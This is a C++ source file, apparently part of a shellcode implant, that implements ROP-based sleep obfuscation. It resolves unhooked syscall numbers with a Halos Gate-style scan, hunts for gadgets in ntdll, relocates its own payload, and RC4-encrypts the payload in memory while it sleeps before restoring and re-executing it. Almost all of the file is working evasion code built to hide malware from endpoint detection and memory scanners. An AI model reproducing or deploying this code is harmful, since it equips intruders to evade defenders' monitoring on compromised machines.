#include <common.h>
#include <constexpr.h>
#include <resolve.h>

using namespace stardust;

#define DWORD_MAX		0xFFFFFFFFUL
#define STUB_SIZE			24
#define FULL_STUB_SIZE		32
#define KEY_SIZE			16
#define SYSCALL_FRAME_SIZE	28
#define FNCTION_FRAME_SIZE	28
#define	PATCHER_FRAME_SIZE	12
#define PADDING_FRAME_SIZE	1

/* Malleable variables thingies and other stuff and fns */

#define SYSCALL_FRAMES		5
#define FNCTION_FRAMES		6
#define PATCHER_FRAMES		4
#define PADDING_FRAMES		1

#define TOTAL_SIZE						\
((SYSCALL_FRAME_SIZE * SYSCALL_FRAMES) +\
 (FNCTION_FRAME_SIZE * FNCTION_FRAMES) +\
 (PATCHER_FRAME_SIZE * PATCHER_FRAMES) +\
 (PADDING_FRAME_SIZE * PADDING_FRAMES))

#define RESOLVE_SYSTEMCALL_SSN(x)									\
    do {															\
        if(!dynamic_ssn_syscall_retrieval( (x),						\
                                           StubHash,				\
                                           ExportDirectory,			\
                                           (PBYTE)(DosHeader),		\
                                           &SyscallServiceNumber,	\
                                           &SyscallAddressJmp		\
	)) {															\
            return ERROR_UNRESOLVED_SYSCALL;						\
        }															\
    } while (0)														\

#define CHECK_GADGET(gadget)										\
    do {															\
        if (!(gadget)) {											\
            return ERROR_UNRESOLVED_GADGETS;						\
        }															\
    } while (0)														\

#define INSERT_PAD_FRAME()							\
	insert_pad_frame(	ChainGadgets, 				\
						ROP_Structure.RopChain, 	\
						&idx						\
	)												\


extern "C" void declfn *memset(void *dst, int c, size_t n) {
    unsigned char *p = (unsigned char*)dst;
    for (size_t i = 0; i < n; i++) p[i] = (unsigned char)c;
    return dst;
}

typedef struct ROP_DATA{
	PVOID New_SHC_Base;
	PVOID Old_SHC_Base;
	UCHAR EncryptionKeys[KEY_SIZE];
	ULONG OldProtection;
	USTRING	Image;
	USTRING Keys;
	LARGE_INTEGER interval;
	DWORD64* RopChain;
	bool triggered;
} ROP_DATA;

typedef struct GADGETS{
	DWORD64	ret;
	DWORD64	jmp_rax;
	DWORD64	jmp_rcx;
	DWORD64	add_rsp_136;
	DWORD64 add_rsp_152;
	DWORD64 pop_r8;
	DWORD64 pop_rax;
	DWORD64 pop_rcx;
	DWORD64 pop_rdx;
	DWORD64 sub_rax_rcx;
	DWORD64 add_rax_rdx;;
	DWORD64 mov_Lr8J_rax;
	DWORD64 mov_rax_LraxJ;
	DWORD64 nop;
	DWORD64	pop_rdx_rcx_r8_r9_r10_r11;
} GADGETS;

typedef enum{
	RET_SIZE 	= 1,
	JOP_SIZE 	= 2,
	POP1_SIZE 	= 2,
	NOP_SIZE 	= 3,
	POP_r8_SIZE	= 3,
	WRITE_SIZE	= 4,
	ADD_RSP_SIZE= 8,
	POP6_SIZE	= 11,
} GADGETS_LENGTHS;

typedef enum{
	RCX_ARG	= 4,
	R10_ARG	= 7,
	ARG2	= 3,
	ARG3	= 5,
	ARG4	= 6,
	ARG5	= 14,
	ARG6	= 15,
	ARG7	= 16,
	ARG8	= 17,
	ARG9	= 18,
	ARG10	= 19,
	ARG11	= 20,
	ARG12	= 21,
	DestAddy= 1,
	SrcAddy	= 3,
	Old_Base_Delta = 5,
	New_Base_Delta = 7,
	Final_ret = 1,
}ARG_IDX;

/* THINGS TO FIX:
 * 1. Linker error about memset not found
 * 2. Compiler black magic whenever I insert 
 * 	  a patch frame (randomly fixed ????/)
 *
 */

static bool declfn dynamic_ssn_syscall_retrieval(	uint32_t FunctionHash,
													uint32_t CheckSum,
													PIMAGE_EXPORT_DIRECTORY ExportDirectory,
													PBYTE PeBase,
													DWORD* SyscallServiceNumber,
													PDWORD* SyscallAddressJmp
){
	#ifdef DEBUG
	auto msvcrt = resolve::module(expr::hash_string<wchar_t>( L"msvcrt.dll" ));
	if( ! (msvcrt) ){
		return false;
	}
	decltype( printf ) * DBG = RESOLVE_API(msvcrt, printf);
	if( ! (DBG) ){
		return false;
	}
	#endif

	PWORD OrdinalTable				= (PWORD) (PeBase + ExportDirectory->AddressOfNameOrdinals);
	PDWORD NameTable				= (PDWORD)(PeBase + ExportDirectory->AddressOfNames);
	PDWORD AddressTable				= (PDWORD)(PeBase + ExportDirectory->AddressOfFunctions);
	PDWORD AddressOfName			= NULL;
	bool found						= false;
	char CheckTest[STUB_SIZE + 1]	= {0};		// null termination for safety

	for(WORD i = 0; i < ExportDirectory->NumberOfNames; i++){
		char* Name = (char*)(PeBase + NameTable[i]);
		if(hash_string(Name) == FunctionHash){
			AddressOfName = (PDWORD)(PeBase + AddressTable[OrdinalTable[i]]);			
			memory::copy(CheckTest, AddressOfName, STUB_SIZE);
			memory::zero(CheckTest + 4, 4);
			#ifdef DEBUG
			DBG("[+] Found function with name %s located at 0x%p\n", Name, (void*)(AddressOfName));
			#endif
			if(hash_string(CheckTest) == CheckSum){
				*SyscallServiceNumber	= *(PDWORD)((PBYTE)AddressOfName + 4);
				*SyscallAddressJmp		=  (PDWORD)((PBYTE)AddressOfName + 18);
				#ifdef DEBUG
				DBG("   \\__[+] Function is not hooked and the SSN is 0x%lx\n", *SyscallServiceNumber);
				DBG("   |__[+] Found location of syscall opcode 0x%p\n", (void*)(*SyscallAddressJmp));
				#endif
				return true;
			}
			else{
				#ifdef DEBUG
				DBG("   \\__[!] Function is hooked!\n");
				#endif
				found = true;
				break;
			}
		}
	}
	if(!found){
		*SyscallServiceNumber	= DWORD_MAX;
		*SyscallAddressJmp		= NULL;
		return false;
	}
	PBYTE AddressUp		= NULL;
	PBYTE AddressDown	= NULL;
	for(DWORD i = 1; i < ExportDirectory->NumberOfFunctions; i++){
		// This is for checking lower SSNs or addresses above the hooked stub
		AddressUp = (PBYTE)AddressOfName - (i * FULL_STUB_SIZE);
		memory::copy(CheckTest, AddressUp , STUB_SIZE);
		memory::zero(CheckTest + 4, 4);
		if(hash_string(CheckTest) == CheckSum){
			*SyscallServiceNumber	= (*(PDWORD)(AddressUp + 4)) + i;
			*SyscallAddressJmp		= (PDWORD)(AddressUp + 18);
			#ifdef DEBUG
			DBG("   \\__[+] Found SSN 0x%lx via Halos Gate with negative delta of %ld\n", *SyscallServiceNumber, i);
			DBG("   |__[+] Found location of unhooked syscall opcode 0x%p\n", (void*)(*SyscallAddressJmp));
			#endif
			return true;
		}
		// This is for checking higher SSNs or addresses below the hooked stub
		AddressDown = (PBYTE)AddressOfName + (i * FULL_STUB_SIZE);
		memory::copy(CheckTest, AddressDown , STUB_SIZE);
		memory::zero(CheckTest + 4, 4);
		if(hash_string(CheckTest) == CheckSum){
			*SyscallServiceNumber	= (*(PDWORD)(AddressDown + 4)) - i;
			*SyscallAddressJmp		= (PDWORD)(AddressUp + 18);
			#ifdef DEBUG
			DBG("   \\__[+] Found SSN 0x%lx via Halos Gate with positive delta of %ld\n", *SyscallServiceNumber, i);
			DBG("   |__[+] Found location of unhooked syscall opcode 0x%p\n", (void*)(*SyscallAddressJmp));
			#endif
			return true;
		}
	}
	#ifdef DEBUG
	DBG("   \\__[!] Every function is hooked!\n");
	#endif
	*SyscallServiceNumber	= DWORD_MAX;
	*SyscallAddressJmp		= NULL;
	return false;
}

static PDWORD declfn gadget_scan(const char* pattern, size_t length, PBYTE PeBase){
	#ifdef DEBUG
	auto msvcrt = resolve::module(expr::hash_string<wchar_t>( L"msvcrt.dll" ));
	if( ! (msvcrt) ){
		return NULL;
	}
	decltype( printf ) * DBG = RESOLVE_API(msvcrt, printf);
	if( ! (DBG) ){
		return NULL;
	}
	#endif
	
	PIMAGE_DOS_HEADER DosHeader 			= (PIMAGE_DOS_HEADER)PeBase;
	PIMAGE_NT_HEADERS NtHeader				= (PIMAGE_NT_HEADERS)(PeBase + DosHeader->e_lfanew);
	PIMAGE_FILE_HEADER FileHeader			= (PIMAGE_FILE_HEADER)(&NtHeader->FileHeader);
	PIMAGE_SECTION_HEADER SectionHeader		= (PIMAGE_SECTION_HEADER)((PBYTE)&NtHeader->OptionalHeader + FileHeader->SizeOfOptionalHeader);
	WORD NumberOfSections = FileHeader->NumberOfSections;
	PBYTE StartAddress	= NULL;
	DWORD Size			= NULL;
	for(WORD i = 0; i < NumberOfSections; i++){
		if(hash_string(SectionHeader[i].Name) == expr::hash_string(".text")){
			StartAddress	= (PBYTE)(PeBase) + SectionHeader[i].VirtualAddress;
			Size			= SectionHeader[i].Misc.VirtualSize;
			break;
		}
	}
	for(DWORD i = 0; i < Size; i++){
		if(!memory::compare((void*)(pattern), (void*)(StartAddress + i), length)){
			#ifdef DEBUG
			DBG("Gadget located @ 0x%p\n", (PVOID)(StartAddress + i));
			#endif
			return (PDWORD)(StartAddress + i);
		}
	}
	#ifdef DEBUG
	DBG("[-] You did not find a gadget\n");
	#endif
	return NULL;
}

static int32_t declfn calculate_stack_delta(int32_t fFrames, ARG_IDX ArgIdx){
	/*	when it comes to the delta we calulate with this function
	 *	this function's only purpose is to calculate delta
	 *	to write to a remote frame during ROP chain execution
	 *	WITHIN a patch frame
	 *	then to get the address of the argument it should be
	 *	SavedOffset += calculate_stack_delta(DELTA, ARG);
	 *	and this offset can be resolved in the patch frame args	
	 */
	return	((PATCHER_FRAME_SIZE) +
			 (fFrames * FNCTION_FRAME_SIZE) + 
			 ArgIdx
	);
}

static void declfn patch_return_address(PVOID* ReturnAddress, PVOID OldBase, PVOID NewBase){
	uintptr_t proxy = (uintptr_t)(*ReturnAddress);
	proxy -= (uintptr_t)(OldBase);
	proxy += (uintptr_t)(NewBase);
	*ReturnAddress = (PVOID)(proxy);
	return;
}

static inline BYTE declfn insert_syscall_frame(	uint32_t StubHash, 
												PBYTE BaseNtDll,
												GADGETS GadgetArray,
												DWORD64* ROPChain, 
												size_t* Offset,
												uint32_t SyscallHash,
												DWORD64 arg1	= 0,
												DWORD64 arg2	= 0,
												DWORD64 arg3	= 0,
												DWORD64 arg4	= 0,
												DWORD64 arg5	= 0,
												DWORD64 arg6	= 0,
												DWORD64 arg7	= 0,
												DWORD64 arg8	= 0,
												DWORD64 arg9	= 0,
												DWORD64 arg10	= 0,
												DWORD64 arg11	= 0,
												DWORD64 arg12	= 0
){
	PIMAGE_DOS_HEADER DosHeader				= (PIMAGE_DOS_HEADER)(BaseNtDll);
	PIMAGE_NT_HEADERS NtHeader				= (PIMAGE_NT_HEADERS)((PBYTE)DosHeader + DosHeader->e_lfanew);	// You make me mad
	PIMAGE_FILE_HEADER FileHeader			= (PIMAGE_FILE_HEADER)&NtHeader->FileHeader;
	PIMAGE_OPTIONAL_HEADER OptionalHeader 	= (PIMAGE_OPTIONAL_HEADER)&NtHeader->OptionalHeader;
	PIMAGE_EXPORT_DIRECTORY ExportDirectory	= (PIMAGE_EXPORT_DIRECTORY)((PBYTE)DosHeader + OptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);  // You make me mad
	DWORD SyscallServiceNumber				= DWORD_MAX;
	PDWORD SyscallAddressJmp				= NULL;
	
	RESOLVE_SYSTEMCALL_SSN(SyscallHash);
	
	ROPChain[(*Offset)++] = (DWORD64)(GadgetArray.pop_rax);
	ROPChain[(*Offset)++] = (DWORD64)(SyscallServiceNumber);
	ROPChain[(*Offset)++] = (DWORD64)(GadgetArray.pop_rdx_rcx_r8_r9_r10_r11);
	ROPChain[(*Offset)++] = (DWORD64)(arg2);
	ROPChain[(*Offset)++] = (DWORD64)(SyscallAddressJmp);	// rcx
	ROPChain[(*Offset)++] = (DWORD64)(arg3);
	ROPChain[(*Offset)++] = (DWORD64)(arg4);
	ROPChain[(*Offset)++] = (DWORD64)(arg1);
	ROPChain[(*Offset)++] = (DWORD64)(NULL);   /* r11 slot */
	ROPChain[(*Offset)++] = (DWORD64)(GadgetArray.jmp_rcx);
	ROPChain[(*Offset)++] = (DWORD64)(GadgetArray.add_rsp_136);
	ROPChain[(*Offset)++] = (DWORD64)(NULL);	// 8
	ROPChain[(*Offset)++] = (DWORD64)(NULL);	// 16
	ROPChain[(*Offset)++] = (DWORD64)(NULL);	// 24
	ROPChain[(*Offset)++] = (DWORD64)(NULL);	// 32
	ROPChain[(*Offset)++] = (DWORD64)(arg5);	// 40						05
	ROPChain[(*Offset)++] = (DWORD64)(arg6);	// 48						06
	ROPChain[(*Offset)++] = (DWORD64)(arg7);	// 56						07
	ROPChain[(*Offset)++] = (DWORD64)(arg8);	// 64						08
	ROPChain[(*Offset)++] = (DWORD64)(arg9);	// 72						09
	ROPChain[(*Offset)++] = (DWORD64)(arg10);	// 80						10
	ROPChain[(*Offset)++] = (DWORD64)(arg11);	// 88						11
	ROPChain[(*Offset)++] = (DWORD64)(arg12);	// 96						12
	ROPChain[(*Offset)++] = (DWORD64)(NULL);	// 104	.. padding
	ROPChain[(*Offset)++] = (DWORD64)(NULL);	// 112
	ROPChain[(*Offset)++] = (DWORD64)(NULL);	// 120
	ROPChain[(*Offset)++] = (DWORD64)(NULL);	// 128
	ROPChain[(*Offset)++] = (DWORD64)(NULL);	// 136
	return THERE_IS_NO_ERROR;
}

static inline void declfn insert_fnction_frame(GADGETS GadgetArray,
										DWORD64* ROPChain, 
										size_t* Offset,
										DWORD64 Function,
										DWORD64 arg1	= 0,
										DWORD64 arg2	= 0,
										DWORD64 arg3	= 0,
										DWORD64 arg4	= 0,
										DWORD64 arg5	= 0,
										DWORD64 arg6	= 0,
										DWORD64 arg7	= 0,
										DWORD64 arg8	= 0,
										DWORD64 arg9	= 0,
										DWORD64 arg10 	= 0,
										DWORD64 arg11 	= 0,
										DWORD64 arg12 	= 0
){	
	ROPChain[(*Offset)++] = (DWORD64)(GadgetArray.pop_rax);
	ROPChain[(*Offset)++] = (DWORD64)(Function);
	ROPChain[(*Offset)++] = (DWORD64)(GadgetArray.pop_rdx_rcx_r8_r9_r10_r11);
	ROPChain[(*Offset)++] = (DWORD64)(arg2);
	ROPChain[(*Offset)++] = (DWORD64)(arg1); // rcx
	ROPChain[(*Offset)++] = (DWORD64)(arg3);
	ROPChain[(*Offset)++] = (DWORD64)(arg4);
	ROPChain[(*Offset)++] = (DWORD64)(NULL);
	ROPChain[(*Offset)++] = (DWORD64)(NULL);   /* r11 slot */
	ROPChain[(*Offset)++] = (DWORD64)(GadgetArray.jmp_rax);
	ROPChain[(*Offset)++] = (DWORD64)(GadgetArray.add_rsp_136);
	ROPChain[(*Offset)++] = (DWORD64)(NULL);	// 8
	ROPChain[(*Offset)++] = (DWORD64)(NULL);	// 16
	ROPChain[(*Offset)++] = (DWORD64)(NULL);	// 24
	ROPChain[(*Offset)++] = (DWORD64)(NULL);	// 32
	ROPChain[(*Offset)++] = (DWORD64)(arg5);	// 40						05
	ROPChain[(*Offset)++] = (DWORD64)(arg6);	// 48						06
	ROPChain[(*Offset)++] = (DWORD64)(arg7);	// 56						07
	ROPChain[(*Offset)++] = (DWORD64)(arg8);	// 64						08
	ROPChain[(*Offset)++] = (DWORD64)(arg9);	// 72						09
	ROPChain[(*Offset)++] = (DWORD64)(arg10);	// 80						10
	ROPChain[(*Offset)++] = (DWORD64)(arg11);	// 88						11
	ROPChain[(*Offset)++] = (DWORD64)(arg12);	// 96						12
	ROPChain[(*Offset)++] = (DWORD64)(NULL);	// 104	.. padding
	ROPChain[(*Offset)++] = (DWORD64)(NULL);	// 112
	ROPChain[(*Offset)++] = (DWORD64)(NULL);	// 120
	ROPChain[(*Offset)++] = (DWORD64)(NULL);	// 128
	ROPChain[(*Offset)++] = (DWORD64)(NULL);	// 136
	return;
}

static inline void declfn insert_patch_frame(	GADGETS gadgetArray,
										DWORD64* ROPChain,
										size_t* Offset,
										bool patching,	// nop ; ret if its patching rip else mov rax, [rax] for loading arguments
										DWORD64 DestAddy,
										DWORD64 SrcAddy,
										DWORD64 Old_Base_Delta,
										DWORD64 New_Base_Delta
){

	ROPChain[(*Offset)++] = gadgetArray.pop_r8;
	ROPChain[(*Offset)++] = DestAddy;
	ROPChain[(*Offset)++] = gadgetArray.pop_rax;
	ROPChain[(*Offset)++] = SrcAddy;
	ROPChain[(*Offset)++] = gadgetArray.pop_rcx;
	ROPChain[(*Offset)++] = Old_Base_Delta;
	ROPChain[(*Offset)++] = gadgetArray.pop_rdx;
	ROPChain[(*Offset)++] = New_Base_Delta;
	ROPChain[(*Offset)++] = gadgetArray.sub_rax_rcx;
	ROPChain[(*Offset)++] = gadgetArray.add_rax_rdx;
	if(patching){
		ROPChain[(*Offset)++] = gadgetArray.nop;
	}else{
		ROPChain[(*Offset)++] = gadgetArray.mov_rax_LraxJ;
	}
	ROPChain[(*Offset)++] = gadgetArray.mov_Lr8J_rax;

	return;
}

static inline void declfn insert_pad_frame(	GADGETS GadgetArray,
										DWORD64* ROPChain,
										size_t* Offset
){
	ROPChain[(*Offset)++] = GadgetArray.nop;
	return;
}

BYTE declfn instance::Blossom(DWORD Delay){
	PVOID Retaddr   = __builtin_return_address( 0 );
	PBYTE BaseNtDll	= (PBYTE)(ntdll.handle);
	constexpr const char SyscallStub[STUB_SIZE]	= {
		'\x4c', '\x8b', '\xd1', 
		'\xb8', '\x00', '\x00', '\x00', '\x00', 
		'\xf6', '\x04', '\x25', '\x08', '\x03', '\xfe', '\x7f', '\x01', 
		'\x75', '\x03', 
		'\x0f', '\x05', 
		'\xc3', 
		'\xcd', '\x2e', 
		'\xc3'
	};
	constexpr const uint32_t StubHash = expr::hash_string(SyscallStub);
	const char ret_g[RET_SIZE]							= { '\xc3' };					  // ret
	const char jmp_rcx_g[JOP_SIZE]						= { '\xff', '\xe1' };			 // jmp rcx
	const char jmp_rax_g[JOP_SIZE]						= { '\xff', '\xe0' };			// jmp rax
	const char pop_rdx_rcx_r8_r9_r10_r11_g[POP6_SIZE]	= { '\x5a', '\x59', '\x41', '\x58', '\x41', '\x59', '\x41', '\x5a', '\x41', '\x5b', '\xc3' }; // pop r8; pop r9; pop r10; pop r11; ret
	const char add_rsp_136_g[ADD_RSP_SIZE]				= { '\x48', '\x81', '\xc4', '\x88', '\x00', '\x00', '\x00', '\xc3' };
	const char add_rsp_152_g[ADD_RSP_SIZE]				= { '\x48', '\x81', '\xc4', '\x98', '\x00', '\x00', '\x00', '\xc3' };
	const char pop_r8_g[POP_r8_SIZE]					= { '\x41', '\x58', '\xc3' };
	const char pop_rax_g[POP1_SIZE]						= { '\x58', '\xc3' };
	const char pop_rcx_g[POP1_SIZE]						= { '\x59', '\xc3' };
	const char pop_rdx_g[POP1_SIZE]						= { '\x5a', '\xc3' };
	const char sub_rax_rcx_g[WRITE_SIZE]				= { '\x48', '\x2b', '\xc1', '\xc3' };
	const char add_rax_rdx_g[WRITE_SIZE]				= { '\x48', '\x03', '\xc2', '\xc3' };
	const char mov_Lr8J_rax_g[WRITE_SIZE]				= { '\x49', '\x89', '\x00', '\xc3' };
	const char mov_rax_LraxJ_g[WRITE_SIZE]				= { '\x48', '\x8b', '\x00', '\xc3' };
	const char nop_g[NOP_SIZE]							= { '\x66', '\x90', '\xc3' };
	/* if you hate the extra size just turn
	 * all these consts into hashes and modify
	 * the pattern scanner to only check hashes
	 */

	GADGETS ChainGadgets					= {0};
	ChainGadgets.ret						= (DWORD64)(gadget_scan(ret_g, RET_SIZE, BaseNtDll));
	ChainGadgets.jmp_rcx					= (DWORD64)(gadget_scan(jmp_rcx_g, JOP_SIZE, BaseNtDll));
	ChainGadgets.jmp_rax					= (DWORD64)(gadget_scan(jmp_rax_g, JOP_SIZE, BaseNtDll));
	ChainGadgets.add_rsp_136 				= (DWORD64)(gadget_scan(add_rsp_136_g, ADD_RSP_SIZE, BaseNtDll));
	ChainGadgets.add_rsp_152				= (DWORD64)(gadget_scan(add_rsp_152_g, ADD_RSP_SIZE, BaseNtDll));
	ChainGadgets.pop_rdx_rcx_r8_r9_r10_r11	= (DWORD64)(gadget_scan(pop_rdx_rcx_r8_r9_r10_r11_g, POP6_SIZE, BaseNtDll));
	ChainGadgets.pop_r8						= (DWORD64)(gadget_scan(pop_r8_g, POP_r8_SIZE, BaseNtDll));
	ChainGadgets.pop_rax					= (DWORD64)(gadget_scan(pop_rax_g, POP1_SIZE, BaseNtDll));
	ChainGadgets.pop_rcx					= (DWORD64)(gadget_scan(pop_rcx_g, POP1_SIZE, BaseNtDll));
	ChainGadgets.pop_rdx					= (DWORD64)(gadget_scan(pop_rdx_g, POP1_SIZE, BaseNtDll));
	ChainGadgets.sub_rax_rcx				= (DWORD64)(gadget_scan(sub_rax_rcx_g, WRITE_SIZE, BaseNtDll));
	ChainGadgets.add_rax_rdx				= (DWORD64)(gadget_scan(add_rax_rdx_g, WRITE_SIZE, BaseNtDll));
	ChainGadgets.mov_Lr8J_rax				= (DWORD64)(gadget_scan(mov_Lr8J_rax_g, WRITE_SIZE, BaseNtDll));
	ChainGadgets.mov_rax_LraxJ				= (DWORD64)(gadget_scan(mov_rax_LraxJ_g, WRITE_SIZE, BaseNtDll));
	ChainGadgets.nop						= (DWORD64)(gadget_scan(nop_g, NOP_SIZE, BaseNtDll));

	CHECK_GADGET(ChainGadgets.ret);
	CHECK_GADGET(ChainGadgets.jmp_rcx);
	CHECK_GADGET(ChainGadgets.jmp_rax);
	CHECK_GADGET(ChainGadgets.add_rsp_136);
	CHECK_GADGET(ChainGadgets.add_rsp_152);
	CHECK_GADGET(ChainGadgets.pop_rdx_rcx_r8_r9_r10_r11);
	CHECK_GADGET(ChainGadgets.pop_r8);
	CHECK_GADGET(ChainGadgets.pop_rax);
	CHECK_GADGET(ChainGadgets.pop_rcx);
	CHECK_GADGET(ChainGadgets.pop_rdx);
	CHECK_GADGET(ChainGadgets.sub_rax_rcx);
	CHECK_GADGET(ChainGadgets.add_rax_rdx);
	CHECK_GADGET(ChainGadgets.mov_Lr8J_rax);
	CHECK_GADGET(ChainGadgets.mov_rax_LraxJ);
	CHECK_GADGET(ChainGadgets.nop);

	size_t idx				=  0;
	uint64_t ReturnValue	=  0;
	CONTEXT SaveCTX 		= {0};
	CONTEXT RopCTX 			= {0};
	SaveCTX.ContextFlags	= CONTEXT_ALL;
	RopCTX.ContextFlags		= CONTEXT_ALL;

	ROP_DATA ROP_Structure 			= {0};
	ROP_Structure.interval.QuadPart = (Delay) * -(1e4);
	ROP_Structure.RopChain 			= (DWORD64*)(msvcrt.realloc(NULL, TOTAL_SIZE * sizeof(DWORD64)));
	if(!ROP_Structure.RopChain){
		return ERROR_UNRESOLVED_MEMORYS;
	}

	ROP_Structure.Keys.Buffer	= ROP_Structure.EncryptionKeys;
	ROP_Structure.Keys.Length	= ROP_Structure.Keys.MaximumLength = KEY_SIZE;	
	
	ROP_Structure.Image.Buffer	= NULL;
	ROP_Structure.Image.Length	= ROP_Structure.Image.MaximumLength = base.length;
	ROP_Structure.triggered		= false;
	kernel32.RtlCaptureContext(&SaveCTX);

	if(ROP_Structure.triggered){
		#ifdef DEBUG
		msvcrt.printf("[+] Successfully performed Sleep Obfuscation now patching addresses!!\n");
		msvcrt.printf("[!] original return address %p\n", Retaddr);
		#endif
		PVOID old = (PVOID)base.address;
		base.address = RipStart();
		for(size_t i = 0; i < base.frame_idx; i++){
			patch_return_address((PVOID*)(base.callstack[i]), old, (PVOID)base.address);
		}
		#ifdef DEBUG
		msvcrt.printf("[+] new return address %p\n", *(PVOID*)(base.callstack[base.frame_idx - 1]));
		msvcrt.printf("[!] original Shellcode location @ %p\n", old);
		msvcrt.printf("[+] new shellcode location @ %p\n", (PVOID)base.address);
		#endif
		base.frame_idx--;
		return THERE_IS_NO_ERROR;
	}

	insert_syscall_frame(	StubHash,
							BaseNtDll,
							ChainGadgets,
							ROP_Structure.RopChain,
							&idx,									// this one reference increases payload by 4kb
							expr::hash_string("NtAllocateVirtualMemory"),
							(DWORD64)(-1),
							(DWORD64)(&ROP_Structure.New_SHC_Base),
							(DWORD64)(0),
							(DWORD64)(&base.length),
							(DWORD64)(MEM_COMMIT | MEM_RESERVE),
							(DWORD64)(PAGE_READWRITE)
	);

	insert_patch_frame(	ChainGadgets,
						ROP_Structure.RopChain,
						&idx,
						false,
						(DWORD64)(ROP_Structure.RopChain + idx +
								calculate_stack_delta(0, RCX_ARG)
						),
						(DWORD64)(&ROP_Structure.New_SHC_Base),
						(DWORD64)(0),
						(DWORD64)(0)
	);

	insert_fnction_frame(	ChainGadgets,
							ROP_Structure.RopChain,
							&idx,
							(DWORD64)(ntdll.memmove),
							(DWORD64)(NULL),			// need to load the pointer that points to this arg
							(DWORD64)(base.address),
							(DWORD64)(base.length)
	);

	insert_syscall_frame(	StubHash,
							BaseNtDll,
							ChainGadgets,
							ROP_Structure.RopChain,
							&idx,
							expr::hash_string("NtProtectVirtualMemory"),
							(DWORD64)(-1),
							(DWORD64)(&base.address),
							(DWORD64)(&base.length),
							(DWORD64)(PAGE_READWRITE),
							(DWORD64)(&ROP_Structure.OldProtection)
	);

	insert_fnction_frame(	ChainGadgets,
							ROP_Structure.RopChain,
							&idx,
							(DWORD64)(ntdll.memset),
							(DWORD64)(base.address),
							(DWORD64)(0),
							(DWORD64)(base.length)
	);

	insert_syscall_frame(	StubHash,
							BaseNtDll,
							ChainGadgets,
							ROP_Structure.RopChain,
							&idx,
							expr::hash_string("NtFreeVirtualMemory"),
							(DWORD64)(-1),
							(DWORD64)(&base.address),
							(DWORD64)(&base.length),
							(DWORD64)(MEM_RELEASE)
	);

	INSERT_PAD_FRAME();

	// I need to be jumping to cryptbase.dll SystemFunction036
	insert_fnction_frame(	ChainGadgets,
							ROP_Structure.RopChain,
							&idx,
							(DWORD64)(advapi32.SystemFunction036),
							(DWORD64)(ROP_Structure.EncryptionKeys),
							(DWORD64)(KEY_SIZE)
	);
	
	insert_patch_frame(	ChainGadgets,
						ROP_Structure.RopChain,
						&idx,
						false,
						(DWORD64)(&ROP_Structure.Image.Buffer),
						(DWORD64)(&ROP_Structure.New_SHC_Base),
						(DWORD64)(0),
						(DWORD64)(0)
	);

	insert_fnction_frame(	ChainGadgets,
							ROP_Structure.RopChain,
							&idx,
							(DWORD64)(advapi32.SystemFunction032),
							(DWORD64)(&ROP_Structure.Image),
							(DWORD64)(&ROP_Structure.Keys)
	);

	insert_syscall_frame(	StubHash,
							BaseNtDll,
							ChainGadgets,
							ROP_Structure.RopChain,
							&idx,
							expr::hash_string("NtWaitForSingleObject"),
							(DWORD64)(-1),
							(DWORD64)(false),
							(DWORD64)(&ROP_Structure.interval)
	);

	insert_fnction_frame(	ChainGadgets,
							ROP_Structure.RopChain,
							&idx,
							(DWORD64)(advapi32.SystemFunction032),
							(DWORD64)(&ROP_Structure.Image),
							(DWORD64)(&ROP_Structure.Keys)
	);

	insert_syscall_frame(	StubHash,
							BaseNtDll,
							ChainGadgets,
							ROP_Structure.RopChain,
							&idx,
							expr::hash_string("NtProtectVirtualMemory"),
							(DWORD64)(-1),
							(DWORD64)(&ROP_Structure.New_SHC_Base),
							(DWORD64)(&base.length),
							(DWORD64)(PAGE_EXECUTE_READ),
							(DWORD64)(&ROP_Structure.OldProtection)
	);

	insert_patch_frame(	ChainGadgets,
						ROP_Structure.RopChain,
						&idx,
						false,
						(DWORD64)(ROP_Structure.RopChain + idx +
								calculate_stack_delta(0, New_Base_Delta)
						),
						(DWORD64)(&ROP_Structure.New_SHC_Base),
						(DWORD64)(0),
						(DWORD64)(0)
	);

	insert_patch_frame(	ChainGadgets,
						ROP_Structure.RopChain,
						&idx,
						true,
						(DWORD64)(&SaveCTX.Rip),
						(DWORD64)(SaveCTX.Rip),
						(DWORD64)(base.address),
						(DWORD64)(NULL)	// i need to load this in rop
	);

	insert_fnction_frame(	ChainGadgets,
							ROP_Structure.RopChain,
							&idx,
							(DWORD64)(kernel32.RtlRestoreContext),
							(DWORD64)(&SaveCTX),
							(DWORD64)(NULL)
	);

	kernel32.RtlCaptureContext(&RopCTX);
	RopCTX.Rip	= ChainGadgets.ret;
	RopCTX.Rsp	= (DWORD64)(ROP_Structure.RopChain);
	ROP_Structure.triggered	= true;
	#ifdef DEBUG
		msvcrt.printf("[*] Going to sleep!!\n"); 
	#endif
	kernel32.RtlRestoreContext(&RopCTX, NULL);
}